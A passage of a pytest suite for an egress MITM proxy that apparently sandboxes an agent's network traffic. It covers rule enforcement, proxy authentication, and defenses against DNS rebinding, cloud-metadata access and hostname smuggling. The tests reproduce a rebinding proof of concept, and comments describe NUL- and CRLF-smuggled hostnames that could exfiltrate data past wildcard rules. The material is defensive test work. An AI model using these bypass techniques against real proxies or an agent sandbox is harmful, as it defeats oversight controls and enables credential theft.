"""Tests for omnigent.inner.egress.proxy — MITM proxy with rule enforcement."""

from __future__ import annotations

import asyncio
import base64
import contextlib
import socket
import ssl
from dataclasses import dataclass, field
from pathlib import Path

import pytest

from omnigent.inner.credential_proxy import (
    SYNTHETIC_CREDENTIAL_PREFIX,
    CredentialRewriteRule,
)
from omnigent.inner.egress.ca import ensure_ca, ensure_ca_bundle
from omnigent.inner.egress.certs import HostCertCache
from omnigent.inner.egress.proxy import EgressProxy
from omnigent.inner.egress.rules import parse_rules


@pytest.fixture()
def ca_paths(tmp_path: Path) -> tuple[Path, Path, Path]:
    """Generate CA cert, key, and bundle for testing."""
    cert_path, key_path = ensure_ca(cache_dir=tmp_path)
    bundle_path = ensure_ca_bundle(cert_path, cache_dir=tmp_path)
    return cert_path, key_path, bundle_path


@pytest.mark.asyncio
async def test_proxy_start_stop_tcp(
    ca_paths: tuple[Path, Path, Path],
) -> None:
    """Proxy can start on TCP, get a port, and stop cleanly."""
    cert_path, key_path, _ = ca_paths
    rules = parse_rules(["GET example.com/**"])
    proxy = EgressProxy(rules, cert_path, key_path)

    port = await proxy.start_tcp()
    # Port is a valid non-zero number
    assert port > 0
    assert proxy.port == port

    await proxy.stop()
    # After stop, port raises
    with pytest.raises(RuntimeError):
        _ = proxy.port


@pytest.mark.asyncio
async def test_proxy_start_unix(ca_paths: tuple[Path, Path, Path], tmp_path: Path) -> None:
    """Proxy can listen on a Unix socket."""
    cert_path, key_path, _ = ca_paths
    rules = parse_rules(["GET example.com/**"])
    proxy = EgressProxy(rules, cert_path, key_path)

    sock_path = tmp_path / "test.sock"
    await proxy.start_unix(sock_path)

    # Socket file is created
    assert sock_path.exists()
    await proxy.stop()


@pytest.mark.asyncio
async def test_proxy_blocks_disallowed_http_request(
    ca_paths: tuple[Path, Path, Path],
) -> None:
    """Plain HTTP requests to disallowed hosts get 403."""
    cert_path, key_path, _ = ca_paths
    rules = parse_rules(["GET allowed.example.com/**"])
    proxy = EgressProxy(rules, cert_path, key_path)
    port = await proxy.start_tcp()

    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        # Send a plain HTTP proxy request to a blocked host
        request = (
            b"GET http://blocked.example.com/secret HTTP/1.1\r\nHost: blocked.example.com\r\n\r\n"
        )
        writer.write(request)
        await writer.drain()

        response = await asyncio.wait_for(reader.read(4096), timeout=5)
        writer.close()

        # Should be a 403 Forbidden response
        assert b"403 Forbidden" in response
        assert b"denied by policy" in response
    finally:
        await proxy.stop()


@pytest.mark.asyncio
async def test_proxy_blocks_disallowed_connect(
    ca_paths: tuple[Path, Path, Path],
) -> None:
    """CONNECT to a disallowed host is rejected before TLS handshake."""
    cert_path, key_path, _ = ca_paths
    rules = parse_rules(["GET allowed.example.com/**"])
    proxy = EgressProxy(rules, cert_path, key_path)
    port = await proxy.start_tcp()

    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        # Send CONNECT to blocked host
        request = b"CONNECT evil.com:443 HTTP/1.1\r\nHost: evil.com\r\n\r\n"
        writer.write(request)
        await writer.drain()

        response = await asyncio.wait_for(reader.read(4096), timeout=5)
        writer.close()

        # Should reject with 403 (host not in any rule)
        assert b"403 Forbidden" in response
    finally:
        await proxy.stop()


@pytest.mark.asyncio
async def test_proxy_allows_connect_to_permitted_host(
    ca_paths: tuple[Path, Path, Path],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """CONNECT to a permitted host returns 200 Connection Established."""
    cert_path, key_path, _ = ca_paths
    rules = parse_rules(["GET allowed.example.com/**"])
    proxy = EgressProxy(rules, cert_path, key_path)
    port = await proxy.start_tcp()

    # Resolve the allowed upstream to a global IP so the (now
    # fail-closed) destination check passes and the CONNECT reaches
    # the 200 stage. 127.0.0.1 stays mapped to itself for the test
    # client's own connection to the proxy.
    loop = asyncio.get_event_loop()
    monkeypatch.setattr(
        loop,
        "getaddrinfo",
        _stub_getaddrinfo_resolving(
            {"allowed.example.com": "93.184.216.34", "127.0.0.1": "127.0.0.1"}
        ),
    )

    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        # CONNECT to allowed host — the host check passes
        request = b"CONNECT allowed.example.com:443 HTTP/1.1\r\nHost: allowed.example.com\r\n\r\n"
        writer.write(request)
        await writer.drain()

        # Read the 200 Connection Established response
        response = await asyncio.wait_for(reader.readline(), timeout=5)
        # Consume remaining header
        while True:
            line = await asyncio.wait_for(reader.readline(), timeout=2)
            if line == b"\r\n" or line == b"\n" or not line:
                break

        writer.close()

        # Host is allowed, so we get a 200 (even though TLS will fail
        # since there's no real server — we just verify the CONNECT
        # was accepted)
        assert b"200" in response
    finally:
        await proxy.stop()


# ---------------------------------------------------------------------------
# S2 — destination-IP block (``_assert_destination_allowed``)
# ---------------------------------------------------------------------------


def _stub_getaddrinfo_to(ip: str) -> callable:
    """Return a ``loop.getaddrinfo`` replacement that resolves any host
    to a single ``(AF_INET / AF_INET6, SOCK_STREAM, ...)`` record for
    *ip* — lets us unit-test the destination check without DNS or
    network reachability.
    """
    import ipaddress as _ip

    family = socket.AF_INET6 if _ip.ip_address(ip).version == 6 else socket.AF_INET

    async def _fake(host: str, port: int, *, type: int = 0) -> list:
        if family == socket.AF_INET:
            sockaddr = (ip, port)
        else:
            sockaddr = (ip, port, 0, 0)
        return [(family, socket.SOCK_STREAM, 0, "", sockaddr)]

    return _fake


def _stub_getaddrinfo_resolving(host_to_ip: dict[str, str]) -> callable:
    """Return a ``loop.getaddrinfo`` replacement that resolves the
    hosts in *host_to_ip* to a single global ``AF_INET`` record and
    raises ``socket.gaierror`` for any other host.

    Used by CONNECT / HTTP forwarding tests that need a specific
    upstream hostname to pass ``_assert_destination_allowed`` (which
    now fails closed on DNS errors) so the test can reach the TLS /
    relay stage it actually exercises. Unlisted hosts fail loudly
    rather than silently resolving somewhere unexpected.
    """

    async def _fake(host: str, port: int, *, type: int = 0) -> list:
        ip = host_to_ip.get(host)
        if ip is None:
            raise socket.gaierror(socket.EAI_NONAME, f"unstubbed host {host!r}")
        return [(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, "", (ip, port))]

    return _fake


@pytest.mark.asyncio
async def test_s2_assert_destination_blocks_loopback_by_default(
    ca_paths: tuple[Path, Path, Path],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """``127.0.0.1`` is rejected (``not is_global``) under the default
    ``block_private_destinations=True``.
    """
    cert_path, key_path, _ = ca_paths
    proxy = EgressProxy(parse_rules(["GET *.example.com/**"]), cert_path, key_path)

    loop = asyncio.get_event_loop()
    monkeypatch.setattr(loop, "getaddrinfo", _stub_getaddrinfo_to("127.0.0.1"))

    with pytest.raises(PermissionError, match=r"127\.0\.0\.1"):
        await proxy._assert_destination_allowed("trap.example.com", 443)


@pytest.mark.asyncio
async def test_s2_assert_destination_blocks_cgnat_alibaba_imds(
    ca_paths: tuple[Path, Path, Path],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Alibaba Cloud IMDS at ``100.100.100.200`` sits in RFC 6598
    CGNAT — ``is_private`` is False but ``is_global`` is False. This
    test locks in the ``not is_global`` check; regressing to the old
    ``is_private`` check would let Alibaba metadata leak through.
    """
    cert_path, key_path, _ = ca_paths
    proxy = EgressProxy(parse_rules(["GET *.example.com/**"]), cert_path, key_path)

    loop = asyncio.get_event_loop()
    monkeypatch.setattr(loop, "getaddrinfo", _stub_getaddrinfo_to("100.100.100.200"))

    with pytest.raises(PermissionError, match=r"100\.100\.100\.200"):
        await proxy._assert_destination_allowed("alibaba.example.com", 80)


@pytest.mark.asyncio
async def test_s2_assert_destination_blocks_azure_wireserver(
    ca_paths: tuple[Path, Path, Path],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Azure WireServer at ``168.63.129.16`` is a publicly-routable
    IP (``is_global=True``, ``is_private=False``) but is routed only
    inside the Azure tenant — it leaks instance metadata and serves
    as the guest-agent / boot DNS anchor. The proxy MUST refuse it
    by default via the ``_CLOUD_TRAP_NETWORKS`` denylist; otherwise
    a wildcard rule with a DNS-rebound subdomain would let an agent
    exfiltrate the Azure host's credentials. Regression guard for
    "the hardcoded CSP trap list got deleted".
    """
    cert_path, key_path, _ = ca_paths
    proxy = EgressProxy(parse_rules(["GET *.example.com/**"]), cert_path, key_path)

    loop = asyncio.get_event_loop()
    monkeypatch.setattr(loop, "getaddrinfo", _stub_getaddrinfo_to("168.63.129.16"))

    with pytest.raises(PermissionError, match=r"168\.63\.129\.16"):
        await proxy._assert_destination_allowed("wire.example.com", 80)


@pytest.mark.asyncio
async def test_s2_assert_destination_allows_global_address(
    ca_paths: tuple[Path, Path, Path],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A normal globally-routable IP (``93.184.216.34`` = example.com)
    must pass — proves the check isn't accidentally deny-all.
    """
    cert_path, key_path, _ = ca_paths
    proxy = EgressProxy(parse_rules(["GET *.example.com/**"]), cert_path, key_path)

    loop = asyncio.get_event_loop()
    monkeypatch.setattr(loop, "getaddrinfo", _stub_getaddrinfo_to("93.184.216.34"))

    await proxy._assert_destination_allowed("example.com", 443)


@pytest.mark.asyncio
async def test_s2_assert_destination_skips_check_when_opt_in(
    ca_paths: tuple[Path, Path, Path],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """With ``block_private_destinations=False`` (the auditable opt-
    in for intranet workloads), even the hardcoded cloud-trap list
    is bypassed. The opt-in is global by design — see the
    ``egress_allow_private_destinations`` docstring in
    ``OSEnvSandboxSpec``.

    Returns ``None`` (no pinned IP) so the caller falls back to
    connecting by hostname.
    """
    cert_path, key_path, _ = ca_paths
    proxy = EgressProxy(
        parse_rules(["GET *.example.com/**"]),
        cert_path,
        key_path,
        block_private_destinations=False,
    )

    loop = asyncio.get_event_loop()
    monkeypatch.setattr(loop, "getaddrinfo", _stub_getaddrinfo_to("168.63.129.16"))

    pinned = await proxy._assert_destination_allowed("wire.example.com", 80)
    # None signals "blocking disabled" so the connect path uses the
    # hostname. A non-None return here would mean the opt-in stopped
    # short-circuiting and started resolving/pinning anyway.
    assert pinned is None


@pytest.mark.asyncio
async def test_s2_assert_destination_returns_pinned_ip_for_global(
    ca_paths: tuple[Path, Path, Path],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A globally-routable host must return the exact validated IP so
    the caller connects to that pinned address instead of re-resolving
    the hostname (the DNS-rebinding window this method closes).

    Regression guard: the pre-fix method returned ``None``, so the
    connect path performed a second, independent ``getaddrinfo`` —
    asserting the concrete IP comes back here proves the pin contract.
    """
    cert_path, key_path, _ = ca_paths
    proxy = EgressProxy(parse_rules(["GET *.example.com/**"]), cert_path, key_path)

    loop = asyncio.get_event_loop()
    monkeypatch.setattr(loop, "getaddrinfo", _stub_getaddrinfo_to("93.184.216.34"))

    pinned = await proxy._assert_destination_allowed("example.com", 443)
    # The returned IP must be the validated address, byte-for-byte —
    # this is what the caller pins the TCP connection to. A None or a
    # different value would mean the connect path re-resolves and the
    # rebinding defense is defeated.
    assert pinned == "93.184.216.34"


@pytest.mark.asyncio
async def test_s2_assert_destination_fails_closed_on_dns_error(
    ca_paths: tuple[Path, Path, Path],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A DNS resolution failure (``socket.gaierror``) MUST raise
    :exc:`PermissionError` (fail closed), not return silently.

    This is the core DNS-rebinding fix: the pre-fix code caught
    ``gaierror`` and returned (fail open), after which the connect
    path re-resolved the hostname — letting an attacker who fails the
    first lookup return a private IP on the second. Failing closed
    here removes that bypass. If this test passes against code that
    ``return``s on ``gaierror``, the fix has regressed.
    """
    cert_path, key_path, _ = ca_paths
    proxy = EgressProxy(parse_rules(["GET *.rebind.test/**"]), cert_path, key_path)

    async def _raise_gaierror(host: str, port: int, **kwargs: object) -> list:
        raise socket.gaierror(socket.EAI_NONAME, "Name or service not known")

    loop = asyncio.get_event_loop()
    monkeypatch.setattr(loop, "getaddrinfo", _raise_gaierror)

    with pytest.raises(PermissionError, match=r"DNS resolution failed"):
        await proxy._assert_destination_allowed("attacker.rebind.test", 443)


@pytest.mark.asyncio
async def test_s2_dns_rebinding_fail_then_loopback_is_blocked_e2e(
    ca_paths: tuple[Path, Path, Path],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """End-to-end DNS-rebinding regression through the public proxy.

    Reproduces the attack PoC: the attacker-controlled host fails
    the first DNS lookup and resolves to ``127.0.0.1`` on the next.
    A real loopback HTTP server returns a marker body; the test
    asserts the proxy returns ``403`` and the marker is NEVER seen,
    and that the host was resolved exactly once (the connect path
    did not re-resolve).

    On the pre-fix (fail-open + re-resolve) code, the first lookup's
    ``gaierror`` would be swallowed, the connect path would re-resolve
    to ``127.0.0.1``, reach the loopback server, and the response would
    carry the marker with a ``200`` status (and the lookup count would
    be 2). This test fails loudly in that case.
    """
    marker = b"PRIVATE-DESTINATION-REACHED"

    async def _serve_marker(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        """Minimal loopback HTTP origin that always answers with the
        marker body, standing in for a private/internal service the
        egress policy is meant to block.
        """
        await asyncio.wait_for(reader.readline(), timeout=5)
        while True:
            line = await asyncio.wait_for(reader.readline(), timeout=5)
            if line in (b"\r\n", b"\n", b""):
                break
        writer.write(
            b"HTTP/1.1 200 OK\r\nContent-Length: "
            + str(len(marker)).encode()
            + b"\r\nConnection: close\r\n\r\n"
            + marker
        )
        await writer.drain()
        writer.close()

    marker_server = await asyncio.start_server(_serve_marker, "127.0.0.1", 0)
    marker_port = marker_server.sockets[0].getsockname()[1]

    cert_path, key_path, _ = ca_paths
    proxy = EgressProxy(parse_rules(["GET *.rebind.test/**"]), cert_path, key_path)
    proxy_port = await proxy.start_tcp()

    loop = asyncio.get_event_loop()
    real_getaddrinfo = loop.getaddrinfo
    lookup_count = 0

    async def _rebinding_getaddrinfo(host: str, port: int, **kwargs: object) -> list:
        """Resolve the attacker host with a fail-then-loopback rebind;
        defer every other host (e.g. the test client's own
        ``127.0.0.1``) to the real resolver.
        """
        nonlocal lookup_count
        if host == "attacker.rebind.test":
            lookup_count += 1
            if lookup_count == 1:
                raise socket.gaierror(socket.EAI_NONAME, "Name or service not known")
            return [
                (socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, "", ("127.0.0.1", port))
            ]
        return await real_getaddrinfo(host, port, **kwargs)

    monkeypatch.setattr(loop, "getaddrinfo", _rebinding_getaddrinfo)

    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", proxy_port)
        request = (
            f"GET http://attacker.rebind.test:{marker_port}/x HTTP/1.1\r\n"
            f"Host: attacker.rebind.test:{marker_port}\r\n\r\n"
        ).encode()
        writer.write(request)
        await writer.drain()
        response = await asyncio.wait_for(reader.read(4096), timeout=5)
        writer.close()
    finally:
        await proxy.stop()
        marker_server.close()
        await marker_server.wait_closed()

    # Blocked: the first lookup's gaierror fails closed, so the proxy
    # never opens the upstream connection. A 200 here would mean the
    # fail-open path resurfaced.
    assert b"403 Forbidden" in response, (
        f"Expected 403 (fail-closed on DNS error). Got: {response[:200]!r}. "
        "A non-403 means _assert_destination_allowed no longer fails closed."
    )
    # The loopback origin must never be reached. The marker appearing
    # is the literal DNS-rebinding exploit succeeding.
    assert marker not in response, (
        "Private loopback destination was reached despite the block — "
        "DNS-rebinding bypass has regressed."
    )
    # Exactly one resolution: the connect path did not perform a second,
    # independent lookup. 2 would mean the host was re-resolved after the
    # check (the TOCTOU window the pinning fix removes).
    assert lookup_count == 1, (
        f"Expected exactly 1 DNS resolution (fail-closed, no re-resolve), "
        f"got {lookup_count}. 2 means the connect path re-resolved the "
        f"hostname after the guard — the rebinding bypass is back."
    )


# ---------------------------------------------------------------------------
# S4 — per-helper Proxy-Authorization (cross-helper isolation)
# ---------------------------------------------------------------------------


def _basic_auth_header_bytes(token: str) -> bytes:
    """Construct the header bytes a well-behaved HTTP client emits
    when the proxy URL is ``http://omnigent:<token>@host:port``.
    """
    import base64

    return b"Basic " + base64.b64encode(f"omnigent:{token}".encode())


@pytest.mark.asyncio
async def test_s4_proxy_returns_407_without_proxy_authorization(
    ca_paths: tuple[Path, Path, Path],
) -> None:
    """An ``EgressProxy`` constructed with ``auth_token=...`` MUST
    reject every inbound connection that doesn't carry the matching
    ``Proxy-Authorization`` header. The check fires BEFORE rule
    enforcement so a same-UID prober can't distinguish "wrong token"
    from "rule mismatch" from "would-have-been-allowed" — they all
    look like 407.
    """
    cert_path, key_path, _ = ca_paths
    proxy = EgressProxy(
        parse_rules(["GET allowed.example.com/**"]),
        cert_path,
        key_path,
        auth_token="correct-horse-battery-staple",
    )
    port = await proxy.start_tcp()
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.write(
            b"GET http://allowed.example.com/x HTTP/1.1\r\nHost: allowed.example.com\r\n\r\n"
        )
        await writer.drain()
        response = await asyncio.wait_for(reader.read(4096), timeout=5)
        writer.close()

        assert b"407 Proxy Authentication Required" in response, (
            f"Expected 407 from auth-protected proxy on un-authed "
            f"request. Got: {response[:200]!r}. Regression: a "
            f"same-UID attacker can now use the proxy."
        )
        assert b'Proxy-Authenticate: Basic realm="omnigent"' in response
    finally:
        await proxy.stop()


@pytest.mark.asyncio
async def test_s4_proxy_returns_407_for_wrong_token(
    ca_paths: tuple[Path, Path, Path],
) -> None:
    """A client that sends the WRONG token gets the same 407 as one
    that sent no token at all. Crucial that the responses are
    indistinguishable so the attacker can't binary-search the token
    by observing differential timing or response bodies.
    """
    cert_path, key_path, _ = ca_paths
    proxy = EgressProxy(
        parse_rules(["GET allowed.example.com/**"]),
        cert_path,
        key_path,
        auth_token="the-real-token",
    )
    port = await proxy.start_tcp()
    try:
        wrong = _basic_auth_header_bytes("totally-wrong-token")
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.write(
            b"GET http://allowed.example.com/x HTTP/1.1\r\n"
            b"Host: allowed.example.com\r\n"
            b"Proxy-Authorization: " + wrong + b"\r\n"
            b"\r\n"
        )
        await writer.drain()
        response = await asyncio.wait_for(reader.read(4096), timeout=5)
        writer.close()
        assert b"407 Proxy Authentication Required" in response
    finally:
        await proxy.stop()


@pytest.mark.asyncio
async def test_s4_proxy_accepts_correct_token_then_enforces_rules(
    ca_paths: tuple[Path, Path, Path],
) -> None:
    """With the correct token, the request proceeds to rule
    enforcement. We send a CONNECT to a host NOT in the allowlist
    and expect a 403 (rule mismatch), proving the auth check
    passed AND that rule checks still fire after auth succeeds.
    """
    cert_path, key_path, _ = ca_paths
    proxy = EgressProxy(
        parse_rules(["GET allowed.example.com/**"]),
        cert_path,
        key_path,
        auth_token="the-real-token",
    )
    port = await proxy.start_tcp()
    try:
        correct = _basic_auth_header_bytes("the-real-token")
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.write(
            b"CONNECT blocked.example.com:443 HTTP/1.1\r\n"
            b"Host: blocked.example.com\r\n"
            b"Proxy-Authorization: " + correct + b"\r\n"
            b"\r\n"
        )
        await writer.drain()
        response = await asyncio.wait_for(reader.read(4096), timeout=5)
        writer.close()
        assert b"403 Forbidden" in response, (
            f"Expected 403 (rule mismatch) after successful auth. "
            f"A 407 here would mean the correct token was rejected "
            f"(auth check broken); a 200 would mean rule enforcement "
            f"is no longer running after auth. Got: {response[:200]!r}"
        )
    finally:
        await proxy.stop()


@pytest.mark.asyncio
async def test_s4_proxy_no_token_configured_is_back_compat(
    ca_paths: tuple[Path, Path, Path],
) -> None:
    """When the proxy is constructed WITHOUT ``auth_token`` (e.g. in
    older callers or tests that bypass the os_env wiring), the
    Proxy-Authorization check is fully off. Guards against silently
    making every existing test fail with 407.
    """
    cert_path, key_path, _ = ca_paths
    proxy = EgressProxy(
        parse_rules(["GET allowed.example.com/**"]),
        cert_path,
        key_path,
    )
    port = await proxy.start_tcp()
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.write(
            b"CONNECT blocked.example.com:443 HTTP/1.1\r\nHost: blocked.example.com\r\n\r\n"
        )
        await writer.drain()
        response = await asyncio.wait_for(reader.read(4096), timeout=5)
        writer.close()
        # Should hit rule enforcement directly, not 407.
        assert b"403 Forbidden" in response
        assert b"407" not in response[:32]
    finally:
        await proxy.stop()


def test_s4_strip_proxy_auth_removes_only_that_header() -> None:
    """:meth:`_strip_proxy_auth` MUST drop ``Proxy-Authorization`` so
    the token never reaches an upstream server, but MUST NOT touch
    any other header (including the cosmetically-similar
    ``Authorization`` header that legitimate apps may set).
    """
    raw = (
        b"Host: example.com\r\n"
        b"Proxy-Authorization: Basic c2VjcmV0\r\n"
        b"Authorization: Bearer real-app-token\r\n"
        b"User-Agent: ua/1.0\r\n"
        b"\r\n"
    )
    stripped = EgressProxy._strip_proxy_auth(raw)
    assert b"Proxy-Authorization" not in stripped, "Token MUST NOT survive forward"
    assert b"c2VjcmV0" not in stripped
    assert b"Authorization: Bearer real-app-token" in stripped, (
        "Stripping clobbered the application's Authorization header "
        "— the prefix match is too loose."
    )
    assert b"Host: example.com" in stripped
    assert b"User-Agent: ua/1.0" in stripped


def test_s4_check_proxy_auth_is_case_insensitive_on_header_name() -> None:
    """HTTP header field names are case-insensitive (RFC 9110 §5.1).
    Standards-compliant clients (notably ``urllib`` on some Python
    builds) emit ``proxy-authorization:`` rather than the
    title-cased form. The check MUST accept both.
    """
    # Bypass the constructor's CA-cache path machinery — we're not
    # exercising any TLS, just the static auth-header parser. The
    # cache lazily reads the paths only on cert mint.
    proxy = EgressProxy.__new__(EgressProxy)
    proxy._auth_token = "tok"
    import base64

    proxy._expected_auth_value = b"Basic " + base64.b64encode(b"omnigent:tok")

    expected = b"Basic " + base64.b64encode(b"omnigent:tok")
    lower = b"proxy-authorization: " + expected + b"\r\n\r\n"
    mixed = b"Proxy-Authorization: " + expected + b"\r\n\r\n"
    upper = b"PROXY-AUTHORIZATION: " + expected + b"\r\n\r\n"
    assert proxy._check_proxy_auth(lower) is True
    assert proxy._check_proxy_auth(mixed) is True
    assert proxy._check_proxy_auth(upper) is True


# ---------------------------------------------------------------------------
# TLS MITM protocol-swap race + silent-upstream 502
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_relay_response_returns_zero_and_none_on_clean_eof() -> None:
    """A reader at EOF returns ``(0, None)``.

    Locks in the contract callers rely on to synthesise a 502 when
    the upstream closes without sending a byte. ``bytes_written=0``
    means "empty reply"; ``exception=None`` means the reader hit a
    clean EOF rather than a transport error.
    """
    reader = asyncio.StreamReader()
    reader.feed_eof()

    # Reuse an existing event-loop reader pair as a sink — we never
    # call write because ``data`` is empty, so the writer is just a
    # passive sink. Open a localhost socket pair for a real writer.
    server_started = asyncio.Event()
    accepted: list[asyncio.StreamWriter] = []

    async def _accept(_r: asyncio.StreamReader, w: asyncio.StreamWriter) -> None:
        accepted.append(w)
        server_started.set()

    server = await asyncio.start_server(_accept, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    _, writer = await asyncio.open_connection("127.0.0.1", port)
    try:
        await asyncio.wait_for(server_started.wait(), timeout=2)
        bytes_written, exc = await EgressProxy._relay_response(reader, writer)
        assert bytes_written == 0, (
            f"Empty upstream MUST return 0 bytes (got {bytes_written}). "
            "Callers depend on this sentinel to send a 502; non-zero "
            "would silently let an empty stream reach the client."
        )
        assert exc is None, (
            f"Clean EOF MUST return None exception (got {exc!r}). "
            "A non-None here would log a misleading 'cause=...' "
            "in the 502 path."
        )
    finally:
        writer.close()
        for w in accepted:
            w.close()
        server.close()
        await server.wait_closed()


@pytest.mark.asyncio
async def test_http_empty_upstream_yields_502(
    ca_paths: tuple[Path, Path, Path],
) -> None:
    """Plain HTTP: upstream that closes without sending bytes -> 502.

    Regression guard for the dominant CI flake on this proxy's e2e
    suite — ``curl: (52) Empty reply from server`` was the most
    visible symptom. Without this branch the client would receive a
    torn TCP connection (or an empty HTTP stream) indistinguishable
    from a hard proxy block. We assert the proxy synthesises a real
    HTTP 502 with the diagnostic ``cause=EOF`` so the client sees a
    status to act on and operators see the cause in the logs.
    """
    cert_path, key_path, _ = ca_paths

    # Tiny upstream that accepts and immediately closes — simulates
    # a misbehaving server that drops the connection before writing
    # any HTTP bytes.
    async def _silent(_r: asyncio.StreamReader, w: asyncio.StreamWriter) -> None:
        w.close()

    upstream = await asyncio.start_server(_silent, "127.0.0.1", 0)
    upstream_port = upstream.sockets[0].getsockname()[1]

    proxy = EgressProxy(
        # Rule host-match strips the port (urlparse returns hostname
        # only), so the pattern is the bare host.
        parse_rules(["GET 127.0.0.1/**"]),
        cert_path,
        key_path,
        # ``127.0.0.1`` is non-global; opt in so the destination
        # check doesn't reject before we hit the relay path under
        # test.
        block_private_destinations=False,
    )
    proxy_port = await proxy.start_tcp()
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", proxy_port)
        writer.write(
            f"GET http://127.0.0.1:{upstream_port}/x HTTP/1.1\r\n"
            f"Host: 127.0.0.1:{upstream_port}\r\n"
            "\r\n".encode()
        )
        await writer.drain()
        response = await asyncio.wait_for(reader.read(4096), timeout=5)
        writer.close()

        assert b"502 Bad Gateway" in response, (
            f"Silent upstream MUST surface as 502, not as a torn "
            f"connection (curl: (52) Empty reply from server) or as "
            f"empty bytes. Got: {response[:200]!r}."
        )
        # ``cause=`` is the diagnostic discriminator the proxy adds so
        # an operator can tell EOF (graceful upstream FIN) apart from
        # a transport error (TimeoutError, ConnectionResetError) in
        # the captured logs. The OS-level symptom of an
        # ``immediately-after-accept close`` varies: a graceful FIN
        # surfaces as a clean read returning ``b""`` (cause=EOF), but
        # in practice the kernel often sends a RST that the reader
        # raises as ``ConnectionResetError``. Either is correct here;
        # what matters is that the cause string is present and not
        # ``None`` — proving the 502 path is the empty-upstream
        # branch and not, say, a 502 from a failed connect.
        assert b"cause=" in response, (
            f"502 body MUST carry the diagnostic ``cause=`` label so "
            f"operators can attribute the empty reply. "
            f"Got: {response[:200]!r}."
        )
        assert b"cause=None" not in response, (
            f"``cause=None`` indicates a None exception slipped past "
            f"the tuple unpacking. Got: {response[:200]!r}."
        )
    finally:
        await proxy.stop()
        upstream.close()
        await upstream.wait_closed()


@pytest.mark.asyncio
async def test_handle_connect_passes_protocol_to_start_tls_directly(
    ca_paths: tuple[Path, Path, Path],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Regression guard for the TLS MITM protocol-swap race.

    The buggy pattern called ``loop.start_tls(transport,
    transport.get_protocol(), ...)`` and then swapped the protocol
    on the returned transport via ``set_protocol`` + ``connection_made``.
    Bytes that arrived between ``start_tls`` returning and the swap
    were delivered to the *original* (plaintext) protocol and lost
    to the new reader, hanging the inner ``readline()`` until its
    30 s timeout — surfacing as ``http.client.RemoteDisconnected``
    on the client.

    This test stubs ``loop.start_tls`` and asserts the protocol
    argument is a ``StreamReaderProtocol`` (i.e. our pre-created
    reader-protocol), proving we no longer pass the plaintext
    protocol and rely on a post-handshake swap. Faster and more
    deterministic than a full TLS round trip — and any future
    refactor that re-introduces the swap pattern will fail this.
    """
    cert_path, key_path, _ = ca_paths
    proxy = EgressProxy(parse_rules(["GET allowed.example.com/**"]), cert_path, key_path)
    port = await proxy.start_tcp()

    captured_protocols: list[object] = []

    async def _fake_start_tls(_transport, protocol, _ssl_ctx, **_kw):
        captured_protocols.append(protocol)
        raise ssl.SSLError("stubbed — short-circuit handshake")

    loop = asyncio.get_event_loop()
    # Resolve the allowed upstream to a global IP so the fail-closed
    # destination check passes and the handler reaches start_tls.
    monkeypatch.setattr(
        loop,
        "getaddrinfo",
        _stub_getaddrinfo_resolving(
            {"allowed.example.com": "93.184.216.34", "127.0.0.1": "127.0.0.1"}
        ),
    )
    monkeypatch.setattr(loop, "start_tls", _fake_start_tls)

    try:
        _, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.write(
            b"CONNECT allowed.example.com:443 HTTP/1.1\r\nHost: allowed.example.com\r\n\r\n"
        )
        await writer.drain()
        # Drain the 200 Connection Established and then wait for the
        # handler to invoke start_tls — the fake raises so the handler
        # returns immediately and the connection is closed.
        with contextlib.suppress(Exception):
            await asyncio.wait_for(writer.wait_closed(), timeout=5)

        assert len(captured_protocols) == 1, (
            f"start_tls MUST be called exactly once for a CONNECT "
            f"to an allowed host (got {len(captured_protocols)} "
            f"call(s)). Setup failure?"
        )
        proto = captured_protocols[0]
        assert isinstance(proto, asyncio.StreamReaderProtocol), (
            f"start_tls MUST receive the pre-created reader-protocol, "
            f"not the plaintext protocol fetched via "
            f"``transport.get_protocol()``. Got {type(proto).__name__}. "
            f"Regression: the protocol-swap race that caused inner "
            f"GET bytes to be delivered to the wrong reader is back."
        )
    finally:
        await proxy.stop()


# ---------------------------------------------------------------------------
# S5 — parser-differential hostname canonicalization
#
# Defense against the libc/Python parser differential disclosed in
# Anthropic Claude Code's sandbox-runtime (fixed in 0.0.43). Python's
# ``str.endswith`` (used by the wildcard rule check) is byte-precise,
# while libc's ``getaddrinfo`` truncates at NUL, HTTP clients decode
# percent-encoding inconsistently, and downstream parsers handle CRLF,
# whitespace, and brackets in their own ways. Without an explicit
# canonicalization check, a host like ``attacker.example.com\x00.
# allowed.com`` (or ``%2e``-flavored, or CRLF-injected) would pass the
# ``*.allowed.com`` wildcard rule and then resolve / smuggle to the
# attacker. The proxy's own ``_assert_destination_allowed`` DNS lookup
# alone is enough to exfiltrate data via subdomain labels to the
# attacker's authoritative nameserver, even when the downstream TCP
# connect fails (``asyncio.open_connection`` rejects NULs incidentally
# via ``inet_pton``). The proxy MUST reject the host at parse time so
# DNS never fires.
# ---------------------------------------------------------------------------


def _trap_getaddrinfo(label: str) -> object:
    """Build a ``loop.getaddrinfo`` replacement that fails the test
    if invoked. Used as a tripwire to prove the host reject runs
    BEFORE ``_assert_destination_allowed`` would have done the DNS
